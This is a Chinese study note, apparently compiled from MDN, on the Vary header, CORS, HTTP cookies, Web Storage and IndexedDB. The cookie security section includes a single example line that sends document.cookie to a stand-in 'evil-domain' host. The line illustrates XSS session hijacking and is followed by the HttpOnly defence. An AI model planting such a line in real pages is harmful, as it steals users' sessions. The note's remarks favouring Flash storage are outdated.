+ 当缓存服务器收到一个请求，只有当前的请求和原始（缓存）的请求头跟缓存的响应头里的Vary都匹配，才能使用缓存的响应。

+ 使用vary头有利于内容服务的动态多样性。例如，使用Vary: User-Agent头，缓存服务器需要通过UA判断是否使用缓存的页面。如果需要区分移动端和桌面端的展示内容，利用这种方式就能避免在不同的终端展示错误的布局。另外，它可以帮助 Google 或者其他搜索引擎更好地发现页面的移动版本，并且告诉搜索引擎没有引入[Cloaking](https://en.wikipedia.org/wiki/Cloaking)。

+ ![The Vary header leads cache to use more HTTP headers as key for the cache.](https://mdn.mozillademos.org/files/13769/HTTPVary.png) 

  ```js
  Vary: User-Agent
  ```

+ 因为移动版和桌面的客户端的请求头中的User-Agent不同， 缓存服务器不会错误地把移动端的内容输出到桌面端到用户。

# HTTP 访问控制（CORS）

+ 跨域资源共享([CORS](https://developer.mozilla.org/en-US/docs/Glossary/CORS)) 是一种机制，它使用额外的 [HTTP](https://developer.mozilla.org/en-US/docs/Glossary/HTTP) 头来告诉浏览器  让运行在一个 origin (domain) 上的Web应用被准许访问来自不同源服务器上的指定的资源。当一个资源从与该资源本身所在的服务器**不同的域、协议或端口**请求一个资源时，资源会发起一个**跨域 HTTP 请求**。
+ 比如，站点 http://domain-a.com 的某 HTML 页面通过 <img> 的 src 请求 http://domain-b.com/image.jpg。
+ 网络上的许多页面都会加载来自不同域的CSS样式表，图像和脚本等资源。  

+ 出于安全原因，浏览器限制从脚本内发起的跨源HTTP请求。 例如，XMLHttpRequest和Fetch API遵循同源策略。 这意味着使用这些API的Web应用程序只能从加载应用程序的同一个域请求HTTP资源，除非**响应报文包含了正确CORS响应头。**
+ （译者注：这段描述不准确，并不一定是浏览器限制了发起跨站请求，也可能是跨站请求可以正常发起，但是返回结果被浏览器拦截了。）
+ 跨域资源共享（ [CORS](https://developer.mozilla.org/en-US/docs/Glossary/CORS) ）机制允许 Web 应用服务器进行跨域访问控制，从而使跨域数据传输得以安全进行。现代浏览器支持在 API 容器中（例如 [`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 或 [Fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) ）使用 CORS，以降低跨域 HTTP 请求所带来的风险。

## 什么情况下需要 CORS ？

+ 跨域资源共享标准（ [cross-origin sharing standard](http://www.w3.org/TR/cors/) ）允许在下列场景中使用跨域 HTTP 请求：
  + 前文提到的由 [`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 或 [Fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) 发起的跨域 HTTP 请求。
  + Web 字体 (CSS 中通过` @font-face `使用跨域字体资源), [因此，网站就可以发布 TrueType 字体资源，并只允许已授权网站进行跨站调用](http://www.webfonts.info/wiki/index.php?title=%40font-face_support_in_Firefox)。
  + [WebGL 贴图](https://developer.mozilla.org/zh-CN/docs/Web/API/WebGL_API/Tutorial/Using_textures_in_WebGL)
  + 使用 `drawImage` 将 Images/video 画面绘制到 canvas
  + 样式表（使用 [CSSOM](https://developer.mozilla.org/en-US/docs/Web/CSS/CSSOM_View)）
+ 本文概述了跨域资源共享机制及其所涉及的 HTTP 头。

## 功能概述

+ 跨域资源共享标准新增了一组 **HTTP 首部字段**，允许服务器声明哪些源站通过浏览器有权限访问哪些资源。
+ 另外，规范要求，对那些可能对服务器数据产生副作用的 HTTP 请求方法（特别是 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 以外的 HTTP 请求，或者搭配某些 MIME 类型的 [`POST`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST) 请求），浏览器必须首先使用 [`OPTIONS`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/OPTIONS) 方法发起一个预检请求（preflight request），从而获知服务端是否允许该跨域请求。服务器确认允许之后，才发起实际的 HTTP 请求。在预检请求的返回中，服务器端也可以通知客户端，是否需要携带身份凭证（包括 [Cookies ](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies)和 HTTP 认证相关数据）。
+ CORS请求失败会产生错误，但是为了安全，在JavaScript代码层面是无法获知到底具体是哪里出了问题。你只能查看浏览器的控制台以得知具体是哪里出现了错误。
+ 接下来的内容将讨论相关场景，并剖析该机制所涉及的 HTTP 首部字段。

## 若干访问控制场景

+ 这里，我们使用三个场景来解释跨域资源共享机制的工作原理。这些例子都使用 [`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 对象。
+ 本文中的 JavaScript 代码片段都可以从 <http://arunranga.com/examples/access-control/> 获得。另外，使用支持跨域  [`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 的浏览器访问该地址，可以看到代码的实际运行结果。

### 简单请求

+ 某些请求不会触发 [CORS 预检请求](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS#Preflighted_requests)。本文称这样的请求为“简单请求”，请注意，该术语并不属于 [Fetch](https://fetch.spec.whatwg.org/) （其中定义了 CORS）规范。若请求满足所有下述条件，则该请求可视为“简单请求”：
+ 使用下列方法之一：
  + [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET)
  + [`HEAD`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/HEAD)
  + [`POST`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST)
+ Fetch 规范定义了[对 CORS 安全的首部字段集合](https://fetch.spec.whatwg.org/#cors-safelisted-request-header)，不得人为设置该集合之外的其他首部字段。该集合为：
  + [`Accept`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept)
  + [`Accept-Language`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Language)
  + [`Content-Language`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Language)
  + [`Content-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type) （需要注意额外的限制）
  + `DPR`
  + `Downlink`
  + `Save-Data`
  + `Viewport-Width`
  + `Width`
+ [`Content-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type) 的值仅限于下列三者之一：
  + `text/plain`
  + `multipart/form-data`
  + `application/x-www-form-urlencoded`
+ 请求中的任意[`XMLHttpRequestUpload`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequestUpload) 对象均没有注册任何事件监听器；[`XMLHttpRequestUpload`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequestUpload) 对象可以使用 [`XMLHttpRequest.upload`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/upload) 属性访问。
+ 请求中没有使用 [`ReadableStream`](https://developer.mozilla.org/zh-CN/docs/Web/API/ReadableStream) 对象。

> **注意:** 这些跨域请求与浏览器发出的其他跨域请求并无二致。如果服务器未返回正确的响应首部，则请求方不会收到任何数据。因此，那些不允许跨域请求的网站无需为这一新的 HTTP 访问控制特性担心。

+ 比如说，假如站点 http://foo.example 的网页应用想要访问 http://bar.other 的资源。http://foo.example 的网页中可能包含类似于下面的 JavaScript 代码：

  ```js
  var invocation = new XMLHttpRequest();
  var url = 'http://bar.other/resources/public-data/';
     
  function callOtherDomain() {
    if(invocation) {    
      invocation.open('GET', url, true);
      invocation.onreadystatechange = handler;
      invocation.send(); 
    }
  }
  ```

+ 客户端和服务器之间使用 CORS 首部字段来处理跨域权限：

+ ![img](https://mdn.mozillademos.org/files/14293/simple_req.png) 

+ 分别检视请求报文和响应报文：

  ```
  GET /resources/public-data/ HTTP/1.1
  Host: bar.other
  User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-us,en;q=0.5
  Accept-Encoding: gzip,deflate
  Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
  Connection: keep-alive
  Referer: http://foo.example/examples/access-control/simpleXSInvocation.html
  Origin: http://foo.example
  
  
  HTTP/1.1 200 OK
  Date: Mon, 01 Dec 2008 00:23:53 GMT
  Server: Apache/2.0.61 
  Access-Control-Allow-Origin: *
  Keep-Alive: timeout=2, max=100
  Connection: Keep-Alive
  Transfer-Encoding: chunked
  Content-Type: application/xml
  
  [XML Data]
  ```

+ 第 1~10 行是请求首部。第10行 的请求首部字段 [`Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin) 表明该请求来源于 `http://foo.exmaple`。

+ 第 13~22 行是来自于 http://bar.other 的服务端响应。响应中携带了响应首部字段 [`Access-Control-Allow-Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Origin)（第 16 行）。使用 [`Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin) 和 [`Access-Control-Allow-Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) 就能完成最简单的访问控制。本例中，服务端返回的 `Access-Control-Allow-Origin: *` 表明，该资源可以被**任意**外域访问。如果服务端仅允许来自 http://foo.example 的访问，该首部字段的内容如下：

  ```
  Access-Control-Allow-Origin: http://foo.example
  ```

+ 现在，除了 http://foo.example，其它外域均不能访问该资源（该策略由请求首部中的 ORIGIN 字段定义，见第10行）。`Access-Control-Allow-Origin` 应当为 * 或者包含由 Origin 首部字段所指明的域名。

### 预检请求

### 附带身份凭证的请求

## HTTP 响应首部字段

+ 本节列出了规范所定义的响应首部字段。上一小节中，我们已经看到了这些首部字段在实际场景中是如何工作的。

### Access-Control-Allow-Origin

+ 响应首部中可以携带一个 [`Access-Control-Allow-Origin`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Origin)` 字段，其语法如下:`

  ```js
  Access-Control-Allow-Origin: <origin> | *
  ```

+ 其中，origin 参数的值指定了允许访问该资源的外域 URI。对于不需要携带身份凭证的请求，服务器可以指定该字段的值为通配符，表示允许来自所有域的请求。

+ 例如，下面的字段值将允许来自 http://mozilla.com 的请求：

  ```html
  Access-Control-Allow-Origin: http://mozilla.com
  ```

+ 如果服务端指定了具体的域名而非“*”，那么响应首部中的 Vary 字段的值必须包含 Origin。这将告诉客户端：服务器对不同的源站返回不同的内容。

### Access-Control-Expose-Headers

### Access-Control-Max-Age

### Access-Control-Allow-Credentials

### Access-Control-Allow-Methods

### Access-Control-Allow-Headers

## HTTP 请求首部字段

+ 本节列出了可用于发起跨域请求的首部字段。请注意，**这些首部字段无须手动设置。 当开发者使用 XMLHttpRequest 对象发起跨域请求时，它们已经被设置就绪。**

### Origin

+ `Origin`首部字段表明预检请求或实际请求的源站。

  ```html
  Origin: <origin>
  ```

  origin 参数的值为源站 URI。它不包含任何路径信息，只是服务器名称。

+ 注意，不管是否为跨域请求，ORIGIN 字段总是被发送。

### Access-Control-Request-Method

### Access-Control-Request-Headers

# HTTP Cookie

## 概述

+ HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。
+ 通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于[无状态](https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless)的HTTP协议记录稳定的状态信息成为了可能。

+ Cookie主要用于以下三个方面：
  + 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
  + 个性化设置（如用户自定义设置、主题等）
  + 浏览器行为跟踪（如跟踪分析用户行为等）

+ Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie渐渐被淘汰。由于服务器指定Cookie后，浏览器的每次请求都会携带Cookie数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 [Web storage API](https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API) （本地存储和会话存储）或 [IndexedDB](https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API) 。

## 创建Cookie

### Set-Cookie响应头部

+ 当服务器收到HTTP请求时，服务器可以在**响应头**里面添加一个[`Set-Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie)选项。浏览器收到响应后通常会保存下Cookie，之后对该服务器每一次请求中都通过[`Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie)请求头部将Cookie信息发送给服务器。
+ 另外，Cookie的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。

+ 服务器使用[`Set-Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie)响应头部向用户代理（一般是浏览器）发送Cookie信息。一个简单的Cookie可能像这样：

  ```js
  Set-Cookie: <cookie名>=<cookie值>
  ```

+ 服务器通过该头部告知客户端保存Cookie信息。

### 在NodeJS中设置响应cookie

+ `response.setHeader(name, value)`

+ Sets a single header value for implicit headers. If this header already exists in the to-be-sent headers, its value will be replaced. Use an array of strings here to send multiple headers with the same name.

  ```js
  response.setHeader('Content-Type', 'text/html');
  response.setHeader('Set-Cookie', ['type=ninja', 'language=javascript']);
  ```

+ Attempting to set a header field name or value that contains invalid characters will result in a [`TypeError`](https://nodejs.org/dist/latest-v8.x/docs/api/errors.html#errors_class_typeerror) being thrown.

+ When headers have been set with [`response.setHeader()`](https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value), they will be merged with any headers passed to [`response.writeHead()`](https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_writehead_statuscode_statusmessage_headers), with the headers passed to[`response.writeHead()`](https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_writehead_statuscode_statusmessage_headers) given precedence.

  ```js
  // returns content-type = text/plain
  const server = http.createServer((req, res) => {
    res.setHeader('Content-Type', 'text/html');
    res.setHeader('X-Foo', 'bar');
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('ok');
  });
  ```

+ 现在，对该服务器发起的每一次**新请求**，浏览器都会将之前保存的Cookie信息通过[`Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie)请求头部再发送给服务器。

### Document.cookies读取cookie

- Document.cookie，获取并设置与当前文档相关联的 [cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)。

  ```js
  allCookies = document.cookie;
  ```

  - 在上面的代码中，allCookies被赋值为一个字符串，该字符串包含所有的Cookie，每条cookie以分号分隔(即, `*key*=*value* `键值对)。

### Document.cookies写入cookie

- ```js
  document.cookie = newCookie;
  ```

- newCookie是一个**键值对形式的字符串**。需要注意的是，用这个方法一次只能对一个cookie进行设置或更新。

- 以下可选的cookie属性值可以跟在键值对后，用来具体化对cookie的设定/更新，使用分号以作分隔：

  - `;path=*path*` (例如 '/', '/mydir') 如果没有定义，默认为当前文档位置的路径。
  - `;domain=*domain*` (例如 'example.com'， 'subdomain.example.com') 如果没有定义，默认为当前文档位置的路径的域名部分。与早期规范相反的是，在域名前面加 . 符将会被忽视，因为浏览器也许会拒绝设置这样的cookie。如果指定了一个域，那么子域也包含在内。
  - `;max-age=*max-age-in-seconds*` (例如一年为60*60*24*365)
  - `;expires=date-in-GMTString-format`如果没有定义，cookie会在对话结束时过期
    - 这个值的格式参见[Date.toUTCString()](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Date/toUTCString) 
  - `;secure` (cookie只通过https协议传输)

- cookie的值字符串可以用[encodeURIComponent()](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/encodeURIComponent)来保证它不包含任何逗号、分号或空格(cookie值中禁止使用这些值).

  ```js
  document.cookie = "name=oeschger";
  document.cookie = "favorite_food=tripe";
  alert(document.cookie);
  // 显示: name=oeschger;favorite_food=tripe
  ```

### 使用doc-cookies库

+ 作为一个格式化过的字符串，cookie的值有时很难被自然地处理。下面的库的目的是通过定义一个和`Storage对象`部分`一致的`对象（docCookies），简化`document.cookie` 的获取方法。它提供完全的Unicode支持。
+ https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie

**注意：**

> 从 Firefox 2 起, 有更好的客户端存储机制用以替代 cookie - [WHATWG DOM Storage](https://developer.mozilla.org/en-US/docs/DOM/Storage).
>
> 你可以通过更新一个cookie的过期时间为0来删除一个cookie。
>
> 请注意, 更多/更大的 cookies 意味着每个请求都要包含更繁重的数据传输. 如果您只是需要存储些 "client-only" 的数据, 那么郑重建议您使用 [WHATWG DOM Storage](https://developer.mozilla.org/en-US/docs/DOM/Storage).

## cookie的属性

### 会话期Cookie

+ 会话期Cookie是最简单的Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。
+ 会话期Cookie不需要指定过期时间（`Expires`）或者有效期（Max-Age）。
+ 需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie也会被保留下来，就好像浏览器从来没有关闭一样。

### 持久性Cookie

+ 和关闭浏览器便失效的会话期Cookie不同，持久性Cookie可以指定一个特定的过期时间（`Expires`）或有效期（`Max-Age`）。

  ```js
  Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
  ```

  > **提示：**当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。

### Cookie的`Secure` 和`HttpOnly` 标记

+ 标记为 `Secure` 的Cookie只应通过被**HTTPS协议**加密过的请求发送给服务端。但即便设置了 `Secure` 标记，敏感信息也不应该通过Cookie传输，因为Cookie有其固有的不安全性，`Secure `标记也无法提供确实的安全保障。
+ 从 Chrome 52 和 Firefox 52 开始，不安全的站点（`http:`）无法使用Cookie的 `Secure` 标记。
+ 为避免跨域脚本 ([XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS)) 攻击，通过JavaScript的 [`Document.cookie`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie) API**无法访问**带有 `HttpOnly` 标记的Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 `HttpOnly` 标记。

### Cookie的作用域

+ `Domain` 和 `Path` 标识定义了Cookie的*作用域：*即Cookie应该发送给哪些URL。
+ `Domain` 标识指定了哪些主机可以接受Cookie。如果不指定，默认为**当前文档的主机**（**不包含子域名**）。如果指定了`Domain`，则一般包含子域名。
  + 例如，如果设置 `Domain=mozilla.org`，则Cookie也包含在子域名中（如`developer.mozilla.org`）。
+ `Path` 标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中）。以字符 `%x2F` ("/") 作为路径分隔符，子路径也会被匹配。
+ 例如，设置 `Path=/docs`，则以下地址都会匹配：
  - `/docs`
  - `/docs/Web/`
  - `/docs/Web/HTTP`

### SameSite Cookies 

+ `SameSite` Cookie允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（[CSRF](https://developer.mozilla.org/en-US/docs/Glossary/CSRF)）。但目前`SameSite` Cookie还处于实验阶段，并不是所有浏览器都支持。

## 安全

+ 路径限制并**不能**阻止从其他路径访问cookie. 使用简单的DOM即可轻易地绕过限制(比如创建一个指向限制路径的, 隐藏的[iframe](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe), 然后访问其 `contentDocument.cookie` 属性). 保护cookie不被非法访问的唯一方法是将它放在另一个域名/子域名之下, 利用[同源策略](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)保护其不被读取.

### 会话劫持和XSS

+ Web应用程序通常使用cookies来标识用户身份及他们的登录会话. 因此通过窃听这些cookie, 就可以劫持已登录用户的会话. 窃听的cookie的常见方法包括社会工程和XSS攻击 

  ```js
  (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
  ```

+ `HttpOnly` 属性可以阻止通过javascript访问cookie, 从而一定程度上遏制这类攻击

## 追踪和隐私

### 第三方Cookie

+ 每个Cookie都会有与之关联的域（Domain），如果Cookie的域和页面的域相同，那么我们称这个Cookie为*第一方Cookie*（*first-party cookie*），如果Cookie的域和页面的域不同，则称之为*第三方Cookie*（*third-party cookie*.）。一个页面包含图片或存放在其他域上的资源（如图片广告）时，第一方的Cookie也只会发送给设置它们的服务器。通过第三方组件发送的第三方Cookie主要用于广告和网络追踪。这方面可以看谷歌使用的Cookie类型（[types of cookies used by Google](https://www.google.com/policies/technologies/types/)）。大多数浏览器默认都允许第三方Cookie，但是可以通过附加组件来阻止第三方Cookie（如[EFF](https://www.eff.org/)的[Privacy Badger](https://addons.mozilla.org/en-US/firefox/addon/privacy-badger-firefox/)）。
+ 如果你没有公开你网站上第三方Cookie的使用情况，当它们被发觉时用户对你的信任程度可能受到影响。一个较清晰的声明（比如在隐私策略里面提及）能够减少或消除这些负面影响。在某些国家已经开始对Cookie制订了相应的法规，可以查看维基百科上例子[cookie statement](https://wikimediafoundation.org/wiki/Cookie_statement)。

### 禁止追踪Do-Not-Track

+ 虽然并没有法律或者技术手段强制要求使用[`DNT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/DNT)，但是通过[`DNT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/DNT)可以告诉Web程序不要对用户行为进行追踪或者跨站追踪。查看[`DNT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/DNT)以获取更多信息。

### 欧盟Cookie指令

+ 关于Cookie，欧盟已经在[2009/136/EC指令](http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136)中提了相关要求，该指令已于2011年5月25日生效。虽然指令并不属于法律，但它要求欧盟各成员国通过制定相关的法律来满足该指令所提的要求。当然，各国实际制定法律会有所差别。
+ 该欧盟指令的大意：在征得用户的同意之前，网站不允许通过计算机、手机或其他设备存储、检索任何信息。自从那以后，很多网站都在网站声明中添加了相关说明，告诉用户他们的Cookie将用于何处。
+ 可以通过[维基百科的相关内容](https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive)获取最新的各国法律和更精确的信息。

### 僵尸Cookie和删不掉的Cookie

+ Cookie的一个极端使用例子是僵尸Cookie（或称之为“删不掉的Cookie”），这类Cookie较难以删除，甚至删除之后会自动重建。它们一般是使用[Web storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)、Flash本地共享对象或者其他技术手段来达到的。相关内容可以看：
+ https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#%E4%BC%9A%E8%AF%9D%E6%9C%9FCookie

#  Web Storage

+ **Web Storage API** 提供机制， 使浏览器能以一种比使用Cookie更直观的方式**存储**键/值对。

## Web Storage 概念和用法

+ Web Storage 包含如下两种机制：
  + `sessionStorage` 为每一个给定的源（given origin）维持一个独立的存储区域，该存储区域在页面会话期间可用（即只要浏览器处于打开状态，包括页面重新加载和恢复）。
  + `localStorage` 同样的功能，但是在浏览器关闭，然后重新打开后数据仍然存在。
+ 这两种机制是通过 [`Window.sessionStorage`](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage) 和 [`Window.localStorage`](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage) 属性使用（更确切的说，在支持的浏览器中 `Window` 对象实现了 `WindowLocalStorage`和 `WindowSessionStorage` 对象并挂在其`localStorage` 和 `sessionStorage` 属性下）—— 调用其中任一对象会创建 [`Storage`](https://developer.mozilla.org/zh-CN/docs/Web/API/Storage) 对象，通过 [`Storage`](https://developer.mozilla.org/zh-CN/docs/Web/API/Storage) 对象，可以设置、获取和移除数据项。对于每个源（origin）`sessionStorage` 和 `localStorage` 使用不同的 Storage 对象——独立运行和控制。
+ https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API
+ 例如，在文档中调用 `localStorage` 将会返回一个 [`Storage`](https://developer.mozilla.org/zh-CN/docs/Web/API/Storage) 对象；调用 `sessionStorage` 返回一个不同的 [`Storage`](https://developer.mozilla.org/zh-CN/docs/Web/API/Storage) 对象。可以使用相同的方式操作这些对象，但是操作是独立的。

## Storage

+ 不论是 [`Window.sessionStorage`](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage) 和 [`Window.localStorage`](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage) 都拥有一下的属性和方法
+ 另外，`Storage` 中的键值对总是以字符串的形式存储。 (需要注意, 和js对象相比, 键值对总是以字符串的形式存储意味着数值类型会自动转化为字符串类型).

### Storage.length

+ 返回一个整数，表示存储在 `Storage` 对象中的数据项数量。

### Storage.key()

+ 该方法接受一个数值 n 作为参数，并返回存储中的第 n 个键名。

### Storage.getItem()

+ 该方法接受一个键名作为参数，返回键名对应的值。

### Storage.setItem()

+ 该方法接受一个键名和值作为参数，将会把键值对添加到存储中，如果键名存在，则更新其对应的值。

### Storage.removeItem()

+ 该方法接受一个键名作为参数，并把该键名从存储中删除。

### Storage.clear()

+ 调用该方法会清空存储中的所有键名。

### 注意

+ 只能以字符串形式储存，所以读写都需要JSON的两个方法配合
+ 而且，读取空的键值对，返回的null，也是字符串形式

### demo

+ 这里我们通过调用 `localStorage` 来访问一个 `Storage` 对象。

+ 首先，使用 `!localStorage.getItem('bgcolor')` 测试本地存储中是否包含该数据项。

  + 如果包含，则运行 `setStyles()` 函数，该函数使用 `localStorage.getItem()` 来获取数据项，并使用这些值更新页面样式。
  + 如果不包含，我们运行另一个函数 `populateStorage()`，该函数使用 `localStorage.setItem()` 设置数据项，然后运行 `setStyles()`。

  ```js
  if(!localStorage.getItem('bgcolor')) {
    populateStorage();
  } else {
    setStyles();
  }
  
  function populateStorage() {
    localStorage.setItem('bgcolor', document.getElementById('bgcolor').value);
    localStorage.setItem('font', document.getElementById('font').value);
    localStorage.setItem('image', document.getElementById('image').value);
  
    setStyles();
  }
  
  function setStyles() {
    var currentColor = localStorage.getItem('bgcolor');
    var currentFont = localStorage.getItem('font');
    var currentImage = localStorage.getItem('image');
  
    document.getElementById('bgcolor').value = currentColor;
    document.getElementById('font').value = currentFont;
    document.getElementById('image').value = currentImage;
  
    htmlElem.style.backgroundColor = '#' + currentColor;
    pElem.style.fontFamily = currentFont;
    imgElem.setAttribute('src', currentImage);
  ```

# IndexedDB

+ **IndexedDB** 是一种低级API，用于客户端存储**大量结构化数据**(包括, 文件/ blobs)。该API使用索引来实现对该数据的高性能搜索。

+ 虽然 [Web Storage](https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API) 对于存储较少量的数据很有用，但对于存储更大量的结构化数据来说，这种方法不太有用。**IndexedDB**提供了一个解决方案。

  > **注意**：IndexedDB API是强大的，但对于简单的情况可能看起来太复杂。如果你更喜欢一个简单的API，请尝试类库，如[localForage](https://localforage.github.io/localForage/), [dexie.js](http://www.dexie.org/), 和 [ZangoDB](https://github.com/erikolson186/zangodb)，使IndexedDB更方便用户。

## 概念和用法

+ IndexedDB是一个事务型数据库系统，类似于基于SQL的RDBMS。 然而不同的是它使用固定列表，IndexedDB是一个基于JavaScript的面向对象的数据库。 IndexedDB允许您存储和检索用键索引的对象; 可以存储[structured clone algorithm](https://developer.mozilla.org/en-US/docs/Web/Guide/API/DOM/The_structured_clone_algorithm)支持的任何对象。 您只需要指定数据库模式，打开与数据库的连接，然后检索和更新一系列事务中的数据。
+ IndexedDB 分别为同步和异步访问提供了单独的 API 。同步 API 本来是要用于仅供 [Web Workers ](https://developer.mozilla.org/en-US/docs/DOM/Worker)内部使用，但是还没有被任何浏览器所实现。异步 API 在 Web Workers 内部和外部都可以使用。
+ 简单理解，是浏览器内置的一个非关系型数据库

# 储存查看器

+ 存储查看器使你能够查看网页使用的多种存储类型。如今，它能够查看如下存储类型：
  - **Cache缓存** — 使用缓存API创建的任何DOM缓存
  - **Cookies** — 所有页面创建的cookies或页面中任何的iframes。还列出了作为网络呼叫响应的一部分创建的Cookie，但仅适用于工具打开时发生的响应
  - **IndexedDB** — 所有页面创建的IndexedDB或或页面中任何的IndexedDB。其对象存储以及存储在这些对象库中的项目。
  - **本地存储**— 所有页面创建*的本地存储*或页面中任何的iframes。
  - **Session存储**—所有页面创建的Session或页面中任何的iframes。

+ 目前，Storage Inspector仅为您提供存储的只读视图。 但我们正努力让您在将来的版本中编辑存储内容。

+ ![1554011850615](F:\OneDrive\JS\assets\1554011850615.png) 

+ https://developer.mozilla.org/zh-CN/docs/Tools/%E5%AD%98%E5%82%A8%E6%9F%A5%E7%9C%8B%E5%99%A8

+ https://www.nowcoder.com/test/question/done?tid=22865052&qid=14747#summary

+ 有时需要将网页中的一些数据保存在浏览器端，这样做的好处是，当下次访问页面时，不需要再次向服务器请求数据，直接就可以从本地读取数据。目前常用的有以下几种方法：

  **cookie**

  cookie会随着每次HTTP请求头信息一起发送，无形中增加了网络流量，另外，cookie能存储的数据容量有限，根据浏览器类型不同而不同，IE6大约只能存储2K。

  **Flash ShareObject**

  这种方式能能解决上面提到的cookie存储的两个弊端，而且能够跨浏览器，应该说是目前最好的本地存储方案。不过，需要在页面中插入一个Flash，当浏览器没有安装Flash控件时就不能用了。所幸的是，没有安装Flash的用户极少。

  缺点：需要安装Flash插件。

  **Google Gear**

  Google开发出的一种本地存储技术。

  缺点：需要安装Gear组件。

  **userData**

  IE浏览器可以使用userData来存储数据，容量可达到640K，这种方案是很可靠的，不需要安装额外的插件。缺点：它仅在IE下有效。

  **sessionStorage**

  使用于Firefox2+的火狐浏览器，用这种方式存储的数据仅窗口级别有效，同一个窗口（或者Tab）页面刷新或者跳转，都能获取到本地存储的数据，当新开窗口或者页面时，原来的数据就失效了。

